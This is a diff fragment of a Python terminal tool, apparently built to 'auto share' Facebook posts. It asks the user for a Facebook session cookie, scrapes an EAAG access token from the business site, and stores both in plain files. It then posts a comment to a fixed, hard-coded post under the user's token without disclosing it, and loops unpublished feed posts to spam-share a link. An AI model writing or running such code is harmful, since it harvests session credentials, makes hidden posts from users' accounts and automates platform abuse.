+	cetak(nel(f'   {P2}Login Cookies First Mona\n\n              {H2}--[ Lx Ariyan Chowdhury]--',title=f'{P2} {H2}[ {P2}🌺Assalamu Walaikum🌺 {H2}]',width=54,padding=(1,4),style='blue'))
+	cetak(nel(f'{P2} Find Cookie From Your Account',subtitle=f'{P2}┌─[ Cookies ]',subtitle_align='left',width=54,padding=1,style='blue'))
+	cookie = input(f"{P}   └──> : {H}")
+	try:
+		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
+		find_token = re.search("(EAAG\w+)", data.text)
+		open("token.txt", "w").write(find_token.group(1))
+		open("cookie.txt", "w").write(cookie)
+		cetak(nel(f'{P2} LOGIN SUCCESSFUL',width=24,style=f"#00FF00"));time.sleep(2)
+		bot_share()
+	except:
+		os.system("rm token.txt cookie.txt")
+		cetak(nel(f'{P2} TOOLS OWNER BY Lx Ariyan Chowdhury ',width=22,style=f"#00FF00"));time.sleep(1.5) 
+		login()
+		
+###----------[ AUTO SHARE ]----------###	
+def bot_share():
+	os.system('clear')
+	try:
+		token = open("token.txt","r").read()
+		cok = open("cookie.txt","r").read()
+		cookie = {"cookie":cok}
+		ip = requests.get("https://api.ipify.org").text
+		nama = ses.get(f"https://graph.facebook.com/me?fields=name&access_token={token}",cookies=cookie).json()["name"]
+		id = requests.get("https://graph.facebook.com/me/?access_token=%s"%(token),cookies={"cookie":cok}).json()["id"]	    
+		requests.post(f"https://graph.facebook.com/826244541950192/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
+	except:
+		os.system("rm token.txt cookie.txt")
+		cetak(nel(f'{P2} TOOLS OWNER MOHAMMAD AHAD!!',width=22,style=f"#00FF00"));time.sleep(1.5)
+		login()
+	os.system('clear')
+	logo_menu()
+	cetak(nel(f'''{P2} User Active     : {H2}{nama} 
+{P2} You Id          : {id}
+{P2} You Ip          : {ip}
+{P2} Current Date    : {hari}, {tanggal}''',title=f'{P2} {H2}[ {P2}ID INFORMATION {H2}]',subtitle_align='left',padding=1,style='blue'))
+	cetak(nel(f'{P2}Hi {H2}{nama}{P2}, copy the post link must be from Facebook Lite otherwise an error will occur when the bot share process runs.',title=f'{P2} {H2}[ {P2}Catatan {H2}]',subtitle_align='left',padding=1,style='blue'))
+	cetak(nel(f'{P2} INPUT FB POST LINK',subtitle=f'{P2}┌─',subtitle_align='left',width=25,padding=0,style='blue'))
+	link = input(f"{P}   └──> : {H}")
+	cetak(nel(f'{P2} LIMIT SHARE',subtitle=f'{P2}┌─',subtitle_align='left',width=22,padding=0,style='blue'))
+	jumlah = int(input(f"{P}   └──> : {H}"))
+	cetak(nel(f'{P2} AUTO SHARE SENT SUCCESSFUL',subtitle=f'{P2}┌─',subtitle_align='left',width=29,padding=0,style='blue'))
+	basariganteng = datetime.now()
+	try:
+		n = 0
+		header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1"}
+		for x in range(jumlah):
+			n+=1
+			post = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text
+			data = json.loads(post)
+			if "id" in post:
+				bas = str(datetime.now()-basariganteng).split('.')[0]
+				print(f'{P}\r   └──> {bas} Berhasil Membagikan {H}{n}{P} Postingan {N} ',end='');sys.stdout.flush()
+			else:
+				print("\n")
+				cetak(nel(f'{P2} AUTO SHARE ERROR COOKIE INVALID',width=35,padding=0,style='red'));exit()
+	except requests.exceptions.ConnectionError:
+		print(f"\n{P}(!) No Internet !");exit()
+bot_share()
+
+
